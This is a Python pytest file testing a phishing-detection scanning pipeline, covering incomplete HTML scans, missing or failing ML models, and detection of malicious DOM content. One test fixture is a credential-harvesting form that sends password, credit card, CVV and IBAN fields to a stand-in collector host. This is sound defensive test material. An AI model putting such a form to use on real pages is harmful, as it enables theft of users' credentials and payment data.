import pytest
from app.core.config import Settings
from app.core.pipeline import ScanningPipeline
from app.models.schemas import StageResult
from app.services.base_scanner import BaseScanner
from app.services.html_scraper_scanner import HtmlScraperScanner
from app.services.ml_model_scanner import MLModelScanner


@pytest.mark.parametrize(
    "html,expected_status",
    [
        (
            b"<html><body><div id='root'></div><script>load()</script></body></html>",
            "unavailable",
        ),
        (b"x" * (1024 * 1024 + 1), "failed"),
    ],
    ids=["unrendered-dynamic-page", "oversized-html"],
)
def test_dynamic_unrendered_or_truncated_html_is_incomplete(
    monkeypatch, html, expected_status
):
    class HtmlResponse:
        headers = {"Content-Type": "text/html"}
        closed = False

        def raise_for_status(self):
            pass

        def iter_content(self, chunk_size):
            yield html

        def close(self):
            self.closed = True

    response = HtmlResponse()
    scanner = HtmlScraperScanner(model_path=None, browser_render_enabled=False)
    monkeypatch.setattr(scanner, "_safe_get", lambda url, headers: (response, url, []))
    result = ScanningPipeline([scanner]).run("https://example.com/")
    assert result.final_verdict == "unknown"
    assert result.stages[0].status == expected_status
    assert result.scan_status == "failed"
    assert response.closed


class HtmlResponse:
    headers = {"Content-Type": "text/html"}

    def __init__(self, html: bytes):
        self.html = html
        self.closed = False

    def raise_for_status(self):
        pass

    def iter_content(self, chunk_size):
        yield self.html

    def close(self):
        self.closed = True


class EstablishedWhois(BaseScanner):
    def __init__(self):
        super().__init__("WhoisScanner")

    def scan(self, url):
        return StageResult(
            scanner=self.name, verdict="clean", details={"signal": "established_domain"}
        )


class CleanUrlModel:
    classes_ = [0, 1]

    def predict_proba(self, features):
        return [[0.98, 0.02]]


@pytest.mark.parametrize(
    "model_failure,expected_status",
    [
        ("missing", "unavailable"),
        ("prediction_failure", "failed"),
    ],
)
def test_missing_html_model_keeps_clean_dom_assessment_incomplete(
    monkeypatch, tmp_path, model_failure, expected_status
):
    response = HtmlResponse(
        b"<html><head><title>Example</title></head><body><p>Ordinary static content.</p></body></html>"
    )
    html = HtmlScraperScanner(model_path=None, browser_render_enabled=False)
    assert html.model is None
    if model_failure == "prediction_failure":

        class FailingHtmlModel:
            classes_ = [0, 1]

            def predict_proba(self, features):
                raise RuntimeError("Model could not predict")

        html.model = FailingHtmlModel()
    monkeypatch.setattr(html, "_safe_get", lambda url, headers: (response, url, []))
    lexical = MLModelScanner(Settings(ml_model_path=str(tmp_path / "absent.pkl")))
    lexical.model = CleanUrlModel()
    result = ScanningPipeline([EstablishedWhois(), lexical, html]).run(
        "https://example.com/"
    )
    assert result.final_verdict == "unknown"
    assert result.scan_status == "partial"
    assert (
        result.stages[1].verdict == "clean" and result.stages[1].status == "completed"
    )
    assert (
        result.stages[2].verdict == "clean" and result.stages[2].status == "completed"
    )
    component = result.stages[3]
    assert component.scanner == "HtmlModelScanner"
    assert component.status == expected_status
    assert component.confidence is None and component.risk_score is None
    assert (
        component.malicious_probability is None and component.clean_probability is None
    )
    assert result.stages[2].training_features["html_features"]
    assert response.closed


def test_missing_html_model_preserves_strong_malicious_dom_rule_evidence(
    monkeypatch, tmp_path
):
    response = HtmlResponse(b"""<html><head><title>Example</title></head><body>
      <form action='https://collector.example/submit'>
        <input type='password' name='password'>
        <input name='credit_card'><input name='cvv'><input name='iban'>
      </form></body></html>""")
    html = HtmlScraperScanner(model_path=None, browser_render_enabled=False)
    monkeypatch.setattr(html, "_safe_get", lambda url, headers: (response, url, []))
    lexical = MLModelScanner(Settings(ml_model_path=str(tmp_path / "absent.pkl")))
    lexical.model = CleanUrlModel()
    result = ScanningPipeline([EstablishedWhois(), lexical, html]).run(
        "https://example.com/"
    )
    assert result.final_verdict == "malicious"
    assert result.scan_status == "partial"
    assert result.stages[2].verdict == "malicious"
    assert result.stages[2].status == "completed"
    assert result.stages[2].details["rule_threat_score"] == 1
    assert result.stages[3].scanner == "HtmlModelScanner"
    assert result.stages[3].status == "unavailable"
